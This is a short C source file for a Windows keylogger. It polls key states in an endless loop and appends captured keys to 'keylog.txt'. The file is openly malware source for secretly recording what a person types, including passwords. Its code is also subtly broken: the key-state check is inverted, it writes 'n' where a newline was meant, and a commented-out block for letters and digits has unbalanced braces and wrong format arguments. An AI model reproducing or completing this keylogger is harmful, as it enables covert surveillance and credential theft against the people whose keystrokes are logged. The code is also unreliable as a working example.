#include <stdio.h>
#include <windows.h>

#define FILENAME "keylog.txt"

void CheckKey(int key);

int main()
{
	while(1)
 	{
 		Sleep(300); // avoid 100% cpu usage
		for(int key=8; key<=190; key++)
 			if (GetAsyncKeyState(key) == HC_ACTION)
 				CheckKey(key);
 	}
 	return 0;
}

void CheckKey(int key)
{
	FILE *pfile = fopen(FILENAME,"a+");
	{
		if (key==8)
	 		fprintf(pfile,"%s","[del]");
		if (key==13)
			fprintf(pfile,"%s","n");
		if (key==32)
			fprintf(pfile,"%s"," ");
		if (key==VK_CAPITAL)
			fprintf(pfile,"%s","[CAPS]");
		if (key==VK_TAB)
			fprintf(pfile,"%s","[TAB]");
		if (key==VK_SHIFT)
			fprintf(pfile,"%s","[SHIFT]");
		if (key==VK_CONTROL)
			fprintf(pfile,"%s","[CTRL]");
		if (key==VK_PAUSE)
			fprintf(pfile,"%s","[PAUSE]");
		if (key==VK_ESCAPE)
			fprintf(pfile,"%s","[ESC]");
		if (key==VK_END)
			fprintf(pfile,"%s","[END]");
		if (key==VK_HOME)
			fprintf(pfile,"%s","[HOME]");
		if (key==VK_LEFT)
			fprintf(pfile,"%s","[LEFT]");
		if (key==VK_UP)
			fprintf(pfile,"%s","[UP]");
		if (key==VK_RIGHT)
			fprintf(pfile,"%s","[RIGHT]");
		if (key==VK_DOWN)
			fprintf(pfile,"%s","[DOWN]");
		if (key==VK_SNAPSHOT)
			fprintf(pfile,"%s","[PRINT]");
		if (key==VK_NUMLOCK)
			fprintf(pfile,"%s","[NUM LOCK]");
		if (key==190 || key==110)
			fprintf(pfile,"%s",".");
		/*
		if (key >=96 && key <= 105)
		{
			key -= 48;
			fprintf(pfile,"%s",&key);
		}
		if (key >=48 && key <= 59)
			fprintf(pfile,"%s",&key);
		if (key !=VK_LBUTTON || key !=VK_RBUTTON)
		{
			if (key >=65 && key <=90)
		{
		if (GetKeyState(VK_CAPITAL))
		fprintf(pfile,"%s",&key);
		else
		{
			key = key +32;
			fprintf(pfile,"%s",&key);

		}
		*/
	}
		
	fclose(pfile);

 }
